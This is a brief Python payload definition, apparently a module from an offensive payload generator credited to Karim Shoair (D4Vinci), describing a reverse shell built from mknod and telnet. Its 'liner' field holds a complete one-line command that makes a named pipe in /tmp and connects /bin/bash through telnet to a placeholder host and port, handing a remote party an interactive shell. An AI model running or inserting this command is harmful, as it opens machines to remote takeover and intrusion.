class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses mknod and telnet to establish a reverse shell."
    function    = "reverse shell"
    liner       = "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mknod /tmp/VAR1 p && telnet TARGET PORT 0</tmp/VAR1|/bin/bash 1>/tmp/VAR1"
